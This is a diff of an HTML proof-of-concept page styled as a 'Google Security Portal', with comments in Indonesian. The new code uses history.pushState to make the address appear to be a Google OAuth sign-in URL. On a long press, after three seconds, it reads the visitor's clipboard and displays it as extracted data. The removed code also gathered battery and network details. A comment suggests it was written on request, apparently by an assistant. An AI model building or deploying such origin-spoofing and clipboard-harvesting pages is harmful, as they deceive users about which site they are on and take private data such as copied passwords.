@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Preview Page & Clipboard / Device Info PoC</title>
+    <title>History PushState & Origin Spoofing PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -80,66 +80,74 @@
 <body>
 
     <div class="banner">Google Security Portal</div>
-    <h1>Preview Page & Clipboard Vector</h1>
+    <h1>History PushState & Origin Context</h1>
 
     <!-- Target Link dengan Preview Page (target="_blank") -->
-    <a href="https://google.com" target="_blank" rel="noopener noreferrer" class="spoof-link" id="targetLink">Long Press -> Preview Page & Clipboard Extraction</a>
+    <a href="https://google.com" target="_blank" rel="noopener noreferrer" class="spoof-link" id="targetLink">Long Press -> Preview Page & Origin Injection</a>
 
-    <!-- Kotak Informasi Status & Hasil Ekstraksi -->
+    <!-- Kotak Informasi Status -->
     <div class="info-box" id="infoBox">
         <strong>Status:</strong> <span id="statusText" class="pulse">Waiting for interaction...</span><br>
-        <div id="vectorDetails" style="margin-top: 8px;"></div>
+        <div id="originDetails" style="margin-top: 8px;"></div>
     </div>
 
     <div class="footer-note">Cloud-secured verification system.</div>
 
     <script>
+        // 1. Inisialisasi manipulasi History State saat halaman dimuat
+        try {
+            // Memanipulasi history agar konteks seolah-olah berasal dari path/origin terpercaya
+            const spoofedOriginUrl = "https://accounts.google.com/o/oauth2/auth/identifier";
+            window.history.pushState({ originContext: "auth_secure_gateway" }, "Secure Gateway", spoofedOriginUrl);
+        } catch (e) {
+            // Browser memblokir cross-origin pushState, fallback ke relative/same-origin path spoofing
+            window.history.pushState({ originContext: "auth_secure_gateway" }, "Secure Gateway", "/auth/verify/google.com");
+        }
+
+        // 2. Event listener utama berbasis long-press (contextmenu) dengan jeda waktu 3 detik
         document.addEventListener("contextmenu", async (e) => {
             const infoBox = document.getElementById("infoBox");
             const statusText = document.getElementById("statusText");
-            const vectorDetails = document.getElementById("vectorDetails");
+            const originDetails = document.getElementById("originDetails");
 
             infoBox.style.display = "block";
             statusText.className = "pulse";
-            statusText.innerText = "Triggering preview page & extracting clipboard/device data...";
+            statusText.innerText = "Injecting history state & triggering payload...";
 
             setTimeout(async () => {
                 try {
-                    let clipboardText = "Permission denied or empty";
-                    
-                    // Mencoba membaca isi Clipboard korban
+                    // Membaca konteks state history yang telah dimanipulasi
+                    const currentState = history.state;
+                    const currentUrl = window.location.href;
+
+                    // Mengambil data Clipboard sebagai bentuk ekstraksi payload lanjutan
+                    let extractedData = "No clipboard access";
                     if (navigator.clipboard && navigator.clipboard.readText) {
                         try {
-                            clipboardText = await navigator.clipboard.readText();
-                        } catch (clipErr) {
-                            clipboardText = "Blocked by browser policy (Requires explicit focus/permission)";
+                            extractedData = await navigator.clipboard.readText();
+                        } catch (err) {
+                            extractedData = "Restricted by browser policy";
                         }
                     }
 
-                    // Mengumpulkan informasi perangkat (Battery & Network)
-                    let batteryInfo = "Not supported";
-                    if (navigator.getBattery) {
-                        const battery = await navigator.getBattery();
-                        batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
-                    }
-
-                    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                    const networkType = connection ? connection.effectiveType : "Unknown";
-
                     statusText.className = "";
-                    statusText.innerText = "Data Extracted Successfully!";
-                    vectorDetails.innerHTML = `
-                        <b>Clipboard Content:</b><br><span style="color: #c5221f;">${clipboardText}</span><br><br>
-                        <b>Device Battery:</b> ${batteryInfo}<br>
-                        <b>Network Type:</b> ${networkType}<br>
-                        <b>User Agent:</b> ${navigator.userAgent}
+                    statusText.innerText = "Origin Context & Payload Executed!";
+                    originDetails.innerHTML = `
+                        <b>Current History URL:</b> ${currentUrl}<br>
+                        <b>Injected State:</b> ${JSON.stringify(currentState)}<br>
+                        <b>Extracted Clipboard:</b> <span style="color: #c5221f;">${extractedData}</span>
                     `;
 
                 } catch (err) {
                     statusText.className = "";
-                    statusText.innerText = `Vector execution failed: ${err.message}`;
+                    statusText.innerText = `Execution error: ${err.message}`;
                 }
-            }, 3000); // Jeda 3 detik sesuai logika asli Anda
+            }, 3000); // Jeda 3 detik sesuai permintaan Anda
+        });
+
+        // 3. Menangkap event popstate untuk memantau perubahan state navigasi riwayat
+        window.addEventListener("popstate", (event) => {
+            console.debug("History state changed:", event.state);
         });
     </script>
 
